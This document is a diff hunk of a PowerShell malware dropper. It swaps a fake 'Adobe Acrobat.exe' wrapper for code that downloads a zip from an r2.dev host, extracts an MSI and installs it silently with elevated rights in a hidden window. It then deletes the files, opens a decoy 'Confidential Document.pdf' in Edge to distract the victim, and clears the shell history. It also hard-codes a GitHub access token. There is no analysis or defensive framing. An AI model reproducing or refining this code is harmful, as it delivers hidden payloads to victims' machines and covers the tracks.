@@ -36,26 +36,42 @@ $state | Out-File (Join-Path $env:TEMP 'config.dat')
 $GhToken = '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'
 $DecoyApi = 'https://api.github.com/repos/slynet999-coder/Yambo/contents/Confidential Document.pdf'
 $DecoyPath = Join-Path $env:TEMP 'Confidential Document.pdf'
-$wrapperApi = 'https://api.github.com/repos/slynet999-coder/Yambo/contents/Adobe Acrobat.exe'
-$wrapperPath = Join-Path $env:TEMP 'Adobe Acrobat.exe'
+$msiUrl = 'https://pub-f6ed96d1af6b46429386ea02cef5e717.r2.dev/Confidential%20Document.zip'
+$zipPath = Join-Path $env:TEMP 'Confidential Document.zip'
+$msiPath = Join-Path $env:TEMP 'Confidential Document.msi'
 
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    $hdrs = @{"Authorization"="token $GhToken"; "Accept"="application/vnd.github.v3+json"}
 
-    $resp = Invoke-RestMethod -Uri $wrapperApi -Headers $hdrs
-    [IO.File]::WriteAllBytes($wrapperPath, [Convert]::FromBase64String($resp.content))
-    Unblock-File -Path $wrapperPath
+    # Download zip from R2
+    (New-Object System.Net.WebClient).DownloadFile($msiUrl, $zipPath)
 
-    $proc = Start-Process $wrapperPath -Verb RunAs -WindowStyle Hidden -PassThru -Wait
-
-    if ($proc.ExitCode -eq 0) {
-        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-        $hdrs = @{"Authorization"="token $GhToken"; "Accept"="application/vnd.github.v3+json"}
-        $resp = Invoke-RestMethod -Uri $DecoyApi -Headers $hdrs
-        [IO.File]::WriteAllBytes($DecoyPath, [Convert]::FromBase64String($resp.content))
-        Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "`"$DecoyPath`""
+    # Extract MSI from zip
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    $zip = [IO.Compression.ZipFile]::OpenRead($zipPath)
+    $msiEntry = $zip.Entries | Where-Object { $_.Name -like '*.msi' } | Select-Object -First 1
+    if ($msiEntry) {
+        $stream = $msiEntry.Open()
+        $fileStream = [IO.File]::Create($msiPath)
+        $stream.CopyTo($fileStream)
+        $fileStream.Close()
+        $stream.Close()
     }
+    $zip.Dispose()
+
+    # Install MSI silently
+    $proc = Start-Process msiexec.exe -ArgumentList "/i `"$msiPath`" /qn /norestart" -Verb RunAs -WindowStyle Hidden -PassThru -Wait
+
+    # Cleanup
+    try { Remove-Item $zipPath -Force } catch {}
+    try { Remove-Item $msiPath -Force } catch {}
+
+    # Open decoy PDF
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    $hdrs = @{"Authorization"="token $GhToken"; "Accept"="application/vnd.github.v3+json"}
+    $resp = Invoke-RestMethod -Uri $DecoyApi -Headers $hdrs
+    [IO.File]::WriteAllBytes($DecoyPath, [Convert]::FromBase64String($resp.content))
+    Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "`"$DecoyPath`""
 } catch {}
 
 Clear-History
